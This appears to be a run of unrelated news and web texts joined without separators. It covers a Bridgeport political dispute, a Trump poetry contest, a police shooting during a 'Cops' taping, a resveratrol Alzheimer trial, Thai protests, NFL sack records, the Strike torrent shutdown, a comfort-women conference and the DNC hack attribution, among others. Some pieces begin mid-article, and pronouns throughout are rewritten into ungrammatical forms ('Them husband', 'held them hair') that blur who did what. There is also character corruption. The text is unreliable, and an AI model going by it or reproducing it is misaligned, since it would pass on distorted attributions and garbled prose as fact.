"And, hopefully, Bridgeport people would be smart enough not to elect him," said this individual, who did not want their name published because the issue is so politically sensitive.
"It is a very bad message to the state of Connecticut," this person said. "Bridgeport has taken raps for years about corrupt government and we've got a pretty clean government right now."
Finch spokesperson Brett Broesder, seen briefly exchanging pleasantries Thursday with the departing Ganim, said afterward that the mayor believes in second chances.
"But we need to set people re-entering our community up for success," Broesder said. "So sex offenders shouldn't work in a day care, and corrupt politicians shouldn't work in government. Elected officials who commit crimes against the public's trust shouldn't be allowed to run again. It's common-sense, and will help protect taxpayers from future harm."

My readers have the best words, as Donald Trump might say. Evidence for that comes from the caliber of the 2,750 poems submitted to my Trump poetry contest. With the help of the Poetry Society of America, I've picked my winners, and here they are, offering us a mix of humor, bite and hope.
Richard Kenney, a published poet from Port Townsend, Wash., offered “A Prayer”:
Dear Generals Three:
If they ask for The Football,
Link arms: Take a knee.
Lisa Grunberger, an associate professor at Temple University who is Jewish, wrote about the vandalism of their house in Philadelphia. An excerpt:
A “J” spray-painted on my olive green house in South Philly,
Its white-hooked tail grazes my daughter's head.
A skinhead, says my neighbor Jorge,
Un racist blanco, no entiendo,
Holding my hand inside their hand
Far longer than any gringo would.
They smell of sawdust and cologne.
I shoot a picture with my phone
Of my daughter underneath the “J.”
Evidence is always good to gather.
They trace the letter with their small finger.
She's just learning about how letters
Make words, and words make sentences.
Doesn't yet know sentences can kill:
Arbeit macht frei. Sentences can lie:
Make America Great Again. Sentences
Can heal: I have a dream. She's fished
A pen from my bag and draws a “K” beside the “J.”
Advanced Placement students at Pittsburg High School in a high-poverty part of the San Francisco Bay Area offered several excellent poems. Natalie Calderon, a 17-year-old Latina student, wrote “Deception”:
America, the so-called land of the free
But is it still free if I take a knee?
Our president wants to “Make America Great Again”
But keeps putting roadblocks in the path of equality
I'm worried things will only get worse from here
I adjure to feel secure but how can I when
My so-called leader is acting so immature
My hope in humanity is fading
Because of all the degrading
My heart hurts as racism is pervading
I feel anger in my soul as it anchors my stomach
My spirit is damaged by the baggage of hate I carry
But I must stay strong for the struggles to come
I just hope my pride doesn't go numb
Many entries attacked Trump, but not all. John Zengel of Asbury, N.J., says he's a conservative who disagrees with Trump but thinks Democrats need to drop the condescension. They wrote this poem, “Perspective From a Hard-Working American,” to reflect the thinking of their father:
What the liberal elite don't get
Is that Trump speaks my language.
If that makes me a racist, so be it.
I'm a hard-working American.
You say you love the poor,
But your sympathy goes to Africa,
And my taxes are given to takers.
What about hard-working Americans?
Your tree-huggers are after our jobs;
Your “values” are after our families;
Your diversity is after our God
Threatening hard-working Americans.
So go ahead, ignore us “deplorables”
And laugh at their scandals, their stupidity, their immorality, their hair.
But who will be laughing in '20?
Us hard-working Americans.
Some of the verse was despairing, but Michael Collins of Salem, Ore., wrote about making a difference in “No Matter How Small”:
I'm sorry for my tone, of late.
It's tiring, decrying hate,
And likely tiresome as well
But ever since the hammer fell
And Trump ascended to the throne
I've told myself my voice alone
Won't make a difference, but that I
Should not interpret that: Don't try.
The Whos that only Horton hears
In Dr. Seuss' book reached ears
Besides the elephant's when they
Cried all together, so, O.K.,
I'll keep on shouting, We are here!
A waste? Perhaps, but it's sincere.
In a similar vein, Lee Robinson, a retired lawyer in Comfort, Tex., ended their elegy on an uplifting note. Them poem, condensed here, is called “Who Says Trump and Poetry Are Incompatible?”
Whom does India's Prime Minister Follow on Twitter? A Text Mining Exercise.
Rahul Blocked Unblock Follow Sep 30, 2017
Much has been said about Indian Prime Minister's twitter following list. Quite a few number of people can be seen indulging in less than cordial discourse with people they'd identify as the opposition (which includes politicians, journalists, liberals, etc). This can be quite problematic as highlighted here —
Hall of shame — Serial abusers, sexist bigots, rumour mongers followed by PM Modi on Twitter
From following the same accounts as Narendra Modi, it appears that their personal Twitter feed is filled with rancour and distortion.
So, who're the people being followed by India's Prime Minister on Twitter? Is there any pattern? Although, this exercise can not conclusively (and does not intend to) answer this, it still throws up interesting results.
As of August 1st, there were around 1700 people being followed by Narendra Modi of which around 683 were Verified Accounts, while the rest (~1017) accounts were Unverified. The verified accounts include mostly official accounts, Head of Governments and other such profiles one would expect any Head of State to follow. However, the high proportion of unverified followers might raise eyebrows for some.
A simple exercise of text mining the bios of unverified people followed by Modi generated the following results —
Story highlights A crew member for the TV show was killed while taping "Cops"
First time in show's 25-year history that staff member killed during production
The investigation into the shooting is ongoing
No word whether the show will stay in production
A crew member working on a taping of "Cops" was inadvertently shot and killed by a police officer during a robbery in Omaha, Nebraska, local officials said Wednesday.
Bryce Dion, an audio technician, is believed to be the first member of the "Cops" production staff killed in the 25-year history of the television show.
The production company behind "Cops," Langley Productions, said in a statement that it was "deeply saddened and shocked by this tragedy and our main concern is helping their family in any way we can."
Dion, 38, had been in Omaha all summer, helping with the production of future "Cops" episodes. The production company described them as a "long term member of the 'Cops' team and a very talented and dedicated person." Their resume lists credits on "Cops" dating back to 2009.
Todd Schmaderer, the Omaha police chief, confirmed at a Wednesday afternoon news conference that a bullet fired by an officer struck Dion during a shootout with the robbery suspect, Cortez Washington, who was also killed.
Schmaderer described Dion as a friend to the officers that he'd been embedded with.
"This is as if we lost one of our own," Schmaderer said. "That is the grieving process we're going through right now."
Dion and a cameraman were traveling with police officers who responded to a robbery inside a Wendy's restaurant on Tuesday night. Schmaderer said the suspect, Washington, fired two shots at the responding officers, who responded with a barrage of gunfire.
It was later discovered that Washington had a pellet gun that fired plastic bullets.
As Washington tried to exit the Wendy's, they passed through a vestibule where Dion was positioned. The "Cops" cameraman was crouched down in another part of the restaurant.
After being struck by a single gunshot, Dion "collapsed just inside the east doorway," according to the police chief.
Washington collapsed outside.
Now, as an investigation ensues, the cameraman's footage has become evidence.
"Based on our viewing of the footage, the officers had no choice other than to respond (the way) they did," Schmaderer said, anticipating questions about why so many shots were fired.
When asked at the press conference if the officers could have been "showing off for the cameras," Schmaderer called that "absolutely ridiculous."
"This was a very harrowing situation," they said.
Asked whether "Cops" would stop production in Omaha, the police chief said, "We haven't gotten that far." The investigation is ongoing, they said, and is relying in part on the "Cops" team's footage.
"Mr. Dion played the ultimate price for their service -- to provide the footage of the real-life dangers that law enforcement officers face on a daily basis to television viewers throughout the world," Schmaderer said.
The crew was reportedly scheduled to wrap up production in the coming days.
"I've seen six or seven of the shows that can be aired, and it just shows amazing professionalism," Schmaderer said.
"Cops," often called one of the original reality shows, was televised by the Fox network for 24 years. Last year it shifted over to the cable channel Spike.
OBJECTIVE:
A randomized, placebo-controlled, double-blind, multicenter 52-week phase 2 trial of resveratrol in individuals with mild to moderate Alzheimer disease (AD) examined its safety and tolerability and effects on biomarker (plasma Aβ40 and Aβ42, CSF Aβ40, Aβ42, tau, and phospho-tau 181) and volumetric MRI outcomes (primary outcomes) and clinical outcomes (secondary outcomes).
METHODS:
Participants (n = 119) were randomized to placebo or resveratrol 500 mg orally once daily (with dose escalation by 500-mg increments every 13 weeks, ending with 1,000 mg twice daily). Brain MRI and CSF collection were performed at baseline and after completion of treatment. Detailed pharmacokinetics were performed on a subset (n = 15) at baseline and weeks 13, 26, 39, and 52.
RESULTS:
Resveratrol and its major metabolites were measurable in plasma and CSF. The most common adverse events were nausea, diarrhea, and weight loss. CSF Aβ40 and plasma Aβ40 levels declined more in the placebo group than the resveratrol-treated group, resulting in a significant difference at week 52. Brain volume loss was increased by resveratrol treatment compared to placebo.
CONCLUSIONS:
Resveratrol was safe and well-tolerated. Resveratrol and its major metabolites penetrated the blood-brain barrier to have CNS effects. Further studies are required to interpret the biomarker changes associated with resveratrol treatment.
CLASSIFICATION OF EVIDENCE:
This study provides Class II evidence that for patients with AD resveratrol is safe, well-tolerated, and alters some AD biomarker trajectories. The study is rated Class II because more than 2 primary outcomes were designated.

Trail hunting, in which fox and hare hunts claim to follow a trail rather than chase animals, could be ‘effectively banned' in an Area of Outstanding Natural Beauty following a public consultation.
At a time when the National Trust is holding a vote on whether or not to ban trail hunting, the Malvern Hills Trust, which protects and manages the iconic landscape to the south west of Worcester, has produced a set of guidelines which will restrict the activities of trail hunts.
This includes requiring the hunts to provide details of where their ‘trails' will be laid in advance, to keep trails away from thickets and other areas where foxes are likely to be, and, most importantly, only allowing trail hunts in which the huntsman, who controls the hounds, knows where the trails have been laid, so they can stop the hounds if they deviate from it.
Jordi Casamitjana, Head of Policy and Research at the League Against Cruel Sports, which contributed to the consultation, said:
"It is refreshing to see that the Malvern Hills Trust understands that ‘trail hunting' is often a sham. Hunts claim to lay animal-based scent trails, though most don't really bother, and then the hounds ‘accidentally' catch an animal as the huntsman claims they did not know they were following a live animal scent instead of the artificial one.
"These new guidelines could effectively have the same effect as a ban on trail hunting in the Malvern Hills as hunts will no longer be able to claim ‘ignorance' if they kill an animal, meaning they may decide not to use that land anymore.
"This is embarrassing for the National Trust, who changed their own regulations on trail hunting recently but, either by accident or design, left far too many gaps which the hunts will exploit.”
Trail hunting was ‘invented' by hunts following the introduction of the Hunting Act 2004, but increasing evidence including footage of ‘kills' and approximately 4,000 hunt monitoring reports stating that no trail was seen to be laid, has led many to believe that trail hunting is nothing but a cover for illegal hunting.
Trail hunting should not be confused with ‘drag hunting', which already existed as a sport, and genuinely uses non-animal based artificial trails in areas without foxes or hares with the full knowledge of the huntsman, meaning 'accidental kills' are practically unheard of.
"There was no genuine reason to invent a new version of drag hunting unless there was an ulterior motive – to carry on killing foxes, deer and hares, and get away with it,” said Jordi Casamitjana.
"This deception is finally being recognised by the public, MPs, and now landowners.
"As practiced today, trail hunting should be banned completely – starting with the National Trust, but then across the whole country. Killing for fun must no longer be tolerated, but at the moment we're letting them get away with it.”
National Trust members can vote to support a motion which will ban trail hunting, ‘exempt' hunting and exercising the hounds on National Trust land. Online and postal voting closes on October 13th or members can vote at the National Trust AGM on October 21st. For more information go to www.league.org.uk/nationaltrust

Notes to Editors
The Malvern Hills hunting policy was updated in September 2017; it is available on request from the League press office. Summary details of the regulations issued by the Malvern Hills Trust (MHT) on hunting:
It bans any type of exempt hunting (all activities in the Schedule 1 of the Hunting Act are banned). If the hunts are hunting in adjacent land and the hounds enter their land by accident, only the huntsman, whipper-in and master are allowed to follow, and only to retrieve the hounds immediately. Details of where the trails will be laid must be sent in advance to MHT 10 days before the event, and the information about where and when the trail hunts will take place can be made public. Each hunt can only undertake four trail hunts per year, and only from October to January (only four of the seven months of the hunting season), and they must request permission in writing a month in advance. Hunting will only be permitted in three areas of the MHT land and hunting in the main spine of the hills will not be permitted. The Master and/or huntsman must have full knowledge about where the trails have been laid. Scent trails cannot be laid through areas of cover. Hunts must be kept to the path of the scent trail and the pack is to be encouraged to keep moving and not permitted to loiter in any area of undergrowth, scrub, gorse, thicket or covert.
Please turn on JavaScript. Media requires JavaScript to play. Advertisement Thai Prime Minister Abhisit Vejjajiva has rejected a demand from protesters to resign and call elections. They spoke on national TV as tens of thousands of demonstrators gathered outside the barracks where they are based. The rally, led by red-shirted supporters of ousted PM Thaksin Shinawatra, was one of the largest in recent years. It passed off peacefully, but two soldiers were hurt when grenades exploded inside another army base. An army spokesperson said the grenades appeared to have been fired into the compound, but said it was not clear who was responsible. AT THE SCENE Rachel Harvey, BBC News, Bangkok With the government appearing determined to resist their demands, the red-shirts decided to up the stakes. Tens of thousands of demonstrators thronged the streets while loudspeakers mounted on trucks delivered a high-decibel repetition of their demand for fresh elections. A line of soldiers in riot gear faced them from inside the iron fence of the army compound, but the mood was once again good-natured. As the day wore on, the army used its own loudspeakers to broadcast jazz tunes composed by the Thai king. The security forces seem to have decided to wait it out in the hope the protests eventually run out of steam, but as night fell the protesters had regrouped in the old part of Bangkok, in no mood yet it seems to give up. In Thaksin's 'red-shirted' country Early in the day, crowds of demonstrators gathered outside the headquarters of the 11th Infantry Battalion barracks in the north of the Thai capital. Several thousand extra soldiers were sent to reinforce security at the barracks - to which the prime minister had moved after the demonstrators set up camp around Government House. As the protesters' deadline for them to step down passed, Mr Abhisit appeared on national television flanked by ministers and coalition allies. "The protesters have demanded that I dissolve the house before midday (0500 GMT) today, but the coalition parties agree the demand cannot be met," they said. "Elections must be held under common rules and genuine calm. We have to listen to other people's voices, not just the protesters." Mr Abhisit then left the army base by helicopter, saying they wanted to inspect the traffic. The BBC's Rachel Harvey, who was outside the barracks, says it is not clear where they are now. FROM GLOBAL VOICES To me, the most interesting thing to observe were the ordinary Thais - vendors, people coming out of their shops, and people streaming from smaller sub-sois [streets] to watch - who were not wearing red, but were cheering as well

Send us your comments The protest passed off in a peaceful and good-humoured manner, our reporter adds, but there was no sign of compromise from either side. The protesters have now returned from the barracks to their base camp at Government House. Red-shirt leaders said they would meet to discuss their next move. One protest leader said the demonstrators would each contribute a small amount of blood to be thrown on the gates of Government House on Tuesday, as a symbol of their determination.

Profile: Thailand's reds and yellows Q&A: Thailand protests In pictures: Bangkok protests Political speeches culminated in a video address by Mr Thaksin, who told the crowd they were bringing democracy to Thailand. Mr Thaksin is living in self-imposed overseas exile after receiving a two-year sentence in absentia for abuse of power; their supporters say that case was politically motivated. The protesters say the present government was installed illegally after Mr Thaksin was ousted in a military coup in 2006, and two subsequent allied governments were deposed by court action. The red-shirt protest leaders insist their movement is non-violent. They say they are prepared to stay in the capital for five days, to pressure the government into calling new elections. The military has been given extra powers to impose curfews and restrict numbers at gatherings if necessary. The last major protests, in April 2009, turned violent, with two deaths and dozens of people injured.

Associated Press / US Presswire Jared Allen (left) and DeMarcus Ware are both on pace to break the NFL's single-season sack record.
Vikings DE Jared Allen (12.5 sacks in eight games) and Cowboys OLB DeMarcus Ware (12 sacks in seven games) are both on pace to break Michael Strahan's single-season sack record of 22.5 set in 2001. Will either guy break the mark? Both? Or will Strahan's standard hold up?
Brian Billick NFL Network
NFL Network Pass rushers have more chances to sack QBs now Both players have a legitimate shot at breaking Strahan's record, and they both have a couple of things working in their favor. As the weather starts to worsen in the latter months of the season, both the Vikings and the Cowboys have the luxury of playing in the steady climate of a home-field dome. Therefore, teams will be more apt to pass rather than have to grind it out in the rain or snow. Second, the NFL has seen a philosophical shift in offensive strategy in which the passing game has become much more prevalent. Based on my calculations, in 2001, the league's top five quarterbacks in passing attempts averaged 35 throws a game. In 2011, that number has inflated to an average of 38 attempts per game, meaning that each pass rusher gets an additional 48 attempts to bring down the quarterback during the course of a 16-game regular season. Giving exceptional pass rushers like Jared Allen and DeMarcus Ware an additional 48 rushes is significant.
Jeff Darlington NFL.com
NFL.com Ware will break Strahan's mark When it comes to piling up sacks, Iâve often noticed a general trend that seems to suggest a rule for defensive players to remember: Itâs always harder in the second half of the season. Teams begin to find ways to combat a hot player, even if it means leaving another area of the field more vulnerable. That was even the case during Michael Strahanâs record-breaking season when they piled up 14 sacks through eight games in 2001. They were on pace for 28. They finished with 22.5.
With that disclaimer issued, Iâm convinced this could be the season when DeMarcus Ware pushes to challenge the record. Ware has already proven the general trend doesnât always apply to him. Teams know they need to stop him, and they still struggle. In 2008, they had nine sacks in the seasonâs first half -â and increased that pace by finishing with 20 for the season. This year? They have 12 sacks through seven games. And their eighth game is against the Seahawks, whose offensive line has given up more sacks (28) than any other team in the NFL.
So watch closely, Strahan. This might be the year your record falls.
Charles Davis NFL Network
NFL Network Can they break record? Yes. Will they? Nope I love the pass rushers, and the intrigue every year about who will be next to challenge and possibly break Michael Strahan's record. Just one year removed from questions about whether they had lost a step, Jared Allen's play in 2011 offers an emphatic N-O as an answer. DeMarcus Ware's play continues to be remarkable.
Can either, or both, break the record? Yes. Will they? I say no, but both get to 20 and offer us a fun ride to the finish.
Jason La Canfora NFL Network
NFL Network Losing teams lead to fewer opportunities I have a feeling the record stands. The weather will turn and field conditions will slow (yes, I know both players play home games in a dome).
Neither of these teams has been very good, and without big leads and opportunities to repeatedly tee off on a quarterback, you aren't getting 23 sacks. Even Strahan's record has the quasi-asterisk from the Favre flop -- was it or wasn't it really a sack -- and I'm not sure these guys will keep up quite this pace.
It will likely take at least one four-sack game and I'm not sure either can pull it off.
The popular torrent search engine Strike has shut down permanently. Following a lawsuit from the RIAA, developer Andrew Sampson decided to stay away from torrent released projects. To mark the end of a turbulent period, they have now released the search engine's source code to the public.
Last December, Aurous developer Andrew Sampson settled their legal dispute with the RIAA for a massive $3 million, according to the legal paperwork.
The legal trouble also affected another popular project Sampson ran, the torrent search engine Strike. While it was not specifically mentioned in the settlement agreement the Florida-based developer decided to pull the plug on this project too.
While the site has been offline for weeks, interest in the project hardly waned. Sampson informs TorrentFreak that over a million visitors still landed on the site, which served pages cached by CloudFlare. In addition, many external services called on the site's defunct API.
This prompted the developer to make the code available for others, releasing it under an open source license.
“I don't want to leave thousands of developers hanging; the API received over 25,000,000 unique requests a month, not to mention the millions of unique users we received every month,” Sampson tells us.
“I wanted to leave something, it may not be the prettiest thing, but the least I can do is extend an olive branch and give people a small tool set for hosting their own search engines.”
With the code anyone can set up a custom torrent search engine, replicating the Strike service. The only thing that's missing are the actual torrent scrapers. After consulting their lawyers, Sampson decided not to make those public.
The past few weeks have been rough for the developer, who says they suffered mentally from their run-in with the RIAA.
“After dealing with this lawsuit I'm a bit taxed mentally, I hit a really low point for a while, depression kind of overwhelmed me, I lost a decade long friendship, a lot of my savings, I just became kind of bitter and angry,” Sampson notes.
However, he's slowly starting to get a grip on reality again and is looking forward to working on new projects. While they still have a healthy interest in P2P and BitTorrent, they will stay away from anything remotely infringing.
“I'd much rather focus my energy on work and building open source tools that don't cross grey lines. It is a lot less stressful and feels great.”
The release of Strike's source code offers the developer the closure they need, so they can move on to other things.
Currently he's working on a new project called Ulterius. This is an open source C# based framework that allows users to manage windows based systems from any HTML5 enabled browser.
“I received a lot of support from the community during this, I can only hope they like what I make next. I'm 20 years old, so I'm just getting started,” they conclude.
Nicola Sturgeon, the SNP leader, has given their support to the England women's football team ahead of their World Cup semi-final clash with Japan tonight.
Miss Sturgeon said "come on England" ahead of the clash, and also said "come on Andy" in reference to Andy Murray's success at Wimbledon.
The SNP leader gave the England women's team their support after they were named the most powerful woman in Britain.
BBC Woman's Hour put them ahead of Anna Wintour, the editor-in-chief of Vogue, and Angeline Jolie, the actor and humanitarian ambassador.
Asked if they will be cheering on England in the "big game", Miss Sturgeon initially paused before it was pointed out that the women's team were playing in the World Cup semi-final.
They said: "My grannie was English. I have no difficulty in saying come on England. If you indulge me to say something else while I have the microphone which is come on Andy as well."

On the Conservative victory in the General Election, they said "we are where we are". They said: "To be honest I didn't want to see David Cameron back in Downing Street. I would far rather have had a minority government situation where we could have held influence, but we are where we are.
"Now my party, with a big team of MPs in the Commons, have to use that influence. I hope the things we will argue for which are driven by what we think is best for Scotland will also be things that are good for people in other parts of the UK as well."

— Time Warner Cable customers are about to get a boost in their Internet speeds. It's part of a system-wide upgrade rolling out this year called TWC Maxx.
“We will be bringing an all-digital lineup, which will improve the video and sound quality,” said TWC public relations manager Scott Pryzwansky.
If your TV plugs directly into a wall, you'll need a digital adapter box. But most customers won't need to do anything. The other big part of the upgrade is an across-the-board boost in Internet speeds for all customers in the Triangle.
“We mean three- to six-times faster Internet speeds, up to 300 megabits per second for some customers as well,” Pryzwansky said.
Time Warner says those new speeds will not increase your bills. Time Warner's upgrade comes as a big, new player prepares to enter the broadband market. Google Fiber announced in January that it's bringing its fiber-optic high-speed service to some Triangle communities.
Raleigh tech blogger and broadband advocate Mark Turner says he's already seeing other companies responding to the new competition.
“North Carolina is no longer going to be a broadband backwater,” they said. “I got a deal last week from one of the legacy providers offering Internet and video that was, like, half the price of what they normally offer.”
They hope it means better service and lower prices in the future.
“It has definitely shaken up the market. It's good for everybody,” Turner said.
Time Warner says it made upgrade plans well before Google Fiber's announcement. The company says it will roll out its higher Internet speeds through the end of the year.
If you need to order a free digital adapter, you can do it on the phone, online or at a Time Warner office until June 30, 2016. The order must be placed by Oct. 29, 2015. After that, the adapters will be billed at $2.75 a month.
WASHINGTON, D.C. — “Among the 200,000 women and girls systematically abducted and forced to serve in Japanese military sex slave camps during WW11, about 1,000 were Filipina,” writer and activist M. Evelina Galang declared at a conference on “comfort women,” held here on Tuesday, March 1.
“Comfort Women” is a term for sex slaves used by the Japanese military during World War II.

“Of those women, 174 Filipinas have come forward,” asserted Galang, who personally met 40 them when they went to the Philippines in 1998. They have since interviewed 15 of the women for their forthcoming book, Lolas' House: Women Living With War.
“My role as a writer is to share their stories, because they teach us something about humanity and how we treat one another, so it doesn't happen again,” they pointed out.
Galang's 2014 novel, Angel de La Luna and the 5th Glorious Mystery, incorporates this subject, which they have worked on passionately for more than a decade.
Attended by more than 70 activists and advocates, scholars and students and policymakers, the six-hour discussion on “Unfinished Apologies: Imperial Japan's Sex Slaves of Wartime Asia,” was co-sponsored by the US-Korea Institute at the School of Advanced International Studies (SAIS) and Asia Policy Point.
Galang was among the panelists, which included researchers, professors and investigative journalists from different parts of the world. They provided an overview of how the system of sex slavery came to be and how it was managed. They also discussed new research on the non-Korean Comfort Women and contemporary understandings of conflict resolution and violence against women in warfare settings.
A modern tragedy
“The issue of comfort women has yet to be resolved fully,” said Jae Ku, director of the US-Korea Institute, in their opening remarks. “It's still a modern tragedy and a human rights crisis.”
Recalling that the governments of Japan and South Korea reached an agreement in December 2015 over this “thorny historical issue,” Ku suggested that it cannot be resolved bilaterally because the victims were not all Korean women.
Historical documents put the total figure of “comfort women” at about 400,000 in comfort stations scattered all over Asia. Women, aged 14 to 30, from China, East Timor, Indonesia, Malaysia, the Netherlands, Philippines and Taiwan were also forced to become military slaves.

“Next to genocide, sexual slavery is the other crime from hell,” said Mindy Kotler, director of Asia Policy Point. “That's why it's important to record their history, to explore who they were and what they experienced. And through active remembering, we will help restore their dignity and humanity.”
Horrific Testimonies
Galang, author and professor of English and sirector of Creative Writing at the University of Miami, devoted most of their presentation to recounting some of the stories of the women they interviewed. Since 1998, they have studied the lives of surviving Filipina “comfort women,” who are members of Liga ng mga Lolang Pilipina (LILA Pilipina).
One of them is Catalina Lorenzo, who lived with their family on a mountainside in Mindanao. Galang shared their story: “One night, while cooking, they heard the Japanese soldiers approaching. Them husband took their baby and hid in the bark of a nearby tree. When the soldiers asked them where their husband was, they told them they didn't have a husband. They didn't believe them They raped and took them to a garrison. When the war was over, their husband would not take them back. A local doctor shamed them and told them it was not their fault. So their husband handed the child to Catalina, but they never showed their affection after that.”
Galang also shared the story of Virgina Villarma, who was only 14 years old when they were raped by Japanese soldiers: “Virginia was searching for food when a jeep of five Japanese soldiers stopped. They ran but they came after them When they caught her, they held their hands down. They pulled them hair. They jabbed them back with their bayonets. They hauled them onto the jeep like a pig bound for market. They drove them to what is now the customs' house. There, the Japanese soldiers put them in a room with many other prisoners, undressed them and held them at gun point. They raped them repeatedly for three months. Until one day, there was a riot and they escaped.”
Most of the Filipinas who were forced into sex slavery by the Japanese Imperial Army went on to live full lives, Galang noted. “Some married and bore many children. Others became vendors or maids, wives of mayors, teachers in classrooms. Still, there were the ones who would go mad and never recover. By the time the women began their campaign for justice, they had grown so old, that the people called them lolas, the Tagalog word for grannies. The stories poured out of the lolas like water from a dam. Horrific testimonies of habitual rape and torture.”
Galang is critical of President Benigno Aquino for not raising the issue of Japan's responsibility during the Emperor's visit to the Philippines last year. “Like all other victims of sexual slavery during the war, Filipina women are demanding an official apology from Japan, an acknowledgement of what they did to these women, and fair compensation for what they went through,” Galang said. “That's the only way to honor their humanity.”
Comfort Stations
Organized between 1941-1945 by the Japanese military in occupied countries, there were more than 5,000 locations throughout Asia where women were forced into prostitution to “comfort” military personnel. A map showing where all the comfort stations were located was projected on two big screens throughout the conference.
Although these women were all victims of sexual exploitation, not all of them experienced the same treatment, however. “That's what I learned in this conference for the first time,” says Galang.
“In other places where women were coerced into sexual servitude, the soldiers were at least required to wear condoms. And curtains partitioned these brothels into private spaces. But this was not the case in the Philippines, where women and young girls were abducted, taken to an abandoned church, raped and then just dumped like trash afterwards,” Galang added.
This typically happens in guerilla-infested towns and barrios in the Philippines where Japanese soldiers set up command posts for two to four months, said Larry Niksch of the Congressional Research Service, who offered this observation during the open forum. “They pick up these women and take turns raping them.”
Never Again
In their keynote address, Taina Bien-Aime, executive director of the Coalition Against Trafficking in Women (CATW), talked about “Women in Warfare, How Far Have We come?” They stressed the need to stop the Japanese government from “historical revisionism” by “attempting to remove from U.S. history textbooks any mention of state-sponsored sexual slavery and comfort women.
“We cannot let their stories die. Theirs is a human story. If you knew that humanity was removed from these women and young girls, you will have to do something. We have a responsibility to make sure this does not happen again.”
They concluded: “The Japanese government must take full responsibility and acknowledge the brutal coercion and human rights violation, issue an official apology and compensate fully all the victims and survivors. We cannot lose hope and resolve that justice is served.”
Among the students who attended the conference was Karlene Kay Chi, 25, a philosophy graduate student at American University, who grew up learning both Filipino and Chinese culture and history. As a Filipina-Chinese American, they feel compelled to learn more about Filipino history, including the stories of the Filipina Comfort women.
The whole issue is “disturbing and upsetting,” they say. “As part of the millennial generation, we have a mission to raise awareness and remind people of the importance and pertinence of this issue. It sets a precedent for other things. If we don't learn from history, we'll be condemned to repeat it.”
After hearing accounts from Galang of Filipino victims, Chi said “It's so refreshing to hear they are people, and not just policy ideas. Their stories are so relatable, horrifying, ghastly, sad, frustrating. I want to keep their heritage alive.”

This project is so incredibly hilarious and inspiring at the same time! In 2003, when Bob Carey and their wife moved to the East Coast, Carey started making The Tutu Project as a way of mixing their old life with their new life, with a little pink frill. Six months after their move, they and their wife, Linda, discovered that they had breast cancer. Since then, Linda has been fighting the disease and Carey has dedicated their photography towards raising money for breast cancer research. Their goal is to raise $75,000 through the sale of their prints and an upcoming book, Ballerina, to be published this fall 2012.
The photographs will make viewers chuckle at this grown man wearing nothing but a pink tutu in absurd situations like frolicking in the snow, laying in the center of Times Square, or standing among rows of corn in the middle of a field. At the same time, we are reminded of the power and impact that this devastating disease can have on women everywhere, particularly in our own lives. Who knew a photograph of a man in a pink tutu could cause such an emotional rollercoaster!
Some say laughter is the best medicine and this project is evidence that Bob and Linda have really embraced that motto. The artist says, “Oddly enough, [Linda's] cancer has taught us that life is good, dealing with it can be hard, and sometimes the very best thing–no, the only thing–we can do to face another day is to laugh at ourselves, and share a laugh with others.”
UPDATE: We're happy to announce that Bob and Linda's story is one of 25 photo stories featured in our new book For Love, published by Chronicle Books! The official release date is March 15, 2016, and the book is currently available to pre-order at Amazon, Barnes and Noble, and Indie Bound.

The Department of Homeland Security and the Office of the Director of National Intelligence confirmed today what cybersecurity companies have asserted since emails from Democratic National Committee employees leaked online over the summer: State-sponsored Russian hackers are responsible for the breach.
“The U.S. Intelligence Community is confident that the Russian government directed the recent compromises of emails from U.S. persons and institutions, including from U.S. political organizations. The recent disclosures of alleged hacked emails on sites like DCLeaks.com and WikiLeaks and by the Guccifer 2.0 online persona are consistent with the methods and motivations of Russian-directed efforts,” DNS and ODNI said in a joint statement, adding, “These thefts and disclosures are intended to interfere with the U.S. election process. Such activity is not new to Moscow — the Russians have used similar tactics and techniques across Europe and Eurasia, for example, to influence public opinion there. We believe, based on the scope and sensitivity of these efforts, that only Russia's senior-most officials could have authorized these activities.”
The intelligence community's attribution of the hacks isn't much of a surprise — cybersecurity firms like CrowdStrike, Mandiant and ThreatConnect all reached the same conclusion in their own independent analyses of the hacks. However, the statement does lend credence to theories that the Guccifer 2.0 persona was hastily crafted after the hacks to take credit for the breach and deflect attention from state-sponsored hackers.
Despite repeated FBI warnings that state election systems and voter registration databases have been targeted by hackers, DHS and ODNI said that the November election is not at risk of a serious cyberattack because of the decentralized nature of the state-by-state election system. The two organizations also pointed out that state election systems are not connected to the internet and said a system of checks and balances is in place to prevent voter fraud.
DHS and ODNI also stressed that the state-level intrusions have not been attributed to Russia. “Some states have also recently seen scanning and probing of their election-related systems, which in most cases originated from servers operated by a Russian company. However, we are not now in a position to attribute this activity to the Russian government,” DHS and ODNI said.
Now that the U.S. has formally blamed Russia for the DNC hack, the Obama Administration might move forward with a response. As we've previously reported, experts believe that the U.S. response to a cyberattack would follow the same norms for a physical conflict, and could include a diplomatic response, economic sanctions or retaliatory hacking.
President Obama has seemed cautious about the possibility of hacking Russian government systems, saying at the G20 Summit in China last month, “Our goal is not to suddenly, in the cyber arena, duplicate a cycle of escalation that we saw when it comes to other arms races in the past, but rather to start instituting some norms so everybody's acting responsibly.”
Democratic presidential candidate Hillary Clinton has seemed more hawkish than Obama on the subject, saying recently that the U.S. should be prepared to “take the fight to those who go after us,” when it comes to cyberattacks.
Trump, meanwhile, expressed skepticism about Russia's involvement in the DNC hack during September's presidential debate. “I don't know if we know it was Russia who broke into the DNC,” Trump said. “Maybe it was. It could also be China, it could be someone sitting on their bed that weighs 400 pounds.”

Last month, at the Beth Torah synagogue in Toronto, I attended a fundraising dinner to benefit the Shaare Zedek Medical Center in Jerusalem. This was a Canadian event: None of the guests in attendance are likely ever to require treatment at Shaare Zedek or any other Israeli health facility. Yet they opened their chequebooks anyway. In that single evening, the organizers managed to raise half a million dollars for a hospital operated by their co-religionists more than 9,000 kilometres away.
And even that sum is just a small part of the massive annual charitable fundraising juggernaut that takes place within the city's Jewish community. The UJA Federation of Greater Toronto alone raises more than $60 million annually in order “to encourage and support Jewish education, Jewish community and to strengthen the quality of Jewish life.”
You don't have to be religious to be generous. But it helps. According to Statistics Canada:
People who are more religiously active (i.e. those who attend religious meetings or services at least once a week) are more inclined to donate and, on average, they make larger donations. In 2010, 93% of them had given money to one or more charitable or non-profit organizations, and their average annual donation was $1,004. In comparison, 83% of donors who attended less often or not at all had donated, and their average annual donation was $313. Studies have shown that people with strong religious convictions also often have stronger pro-social and altruistic values, which motivate them to give more of their time and money to others.
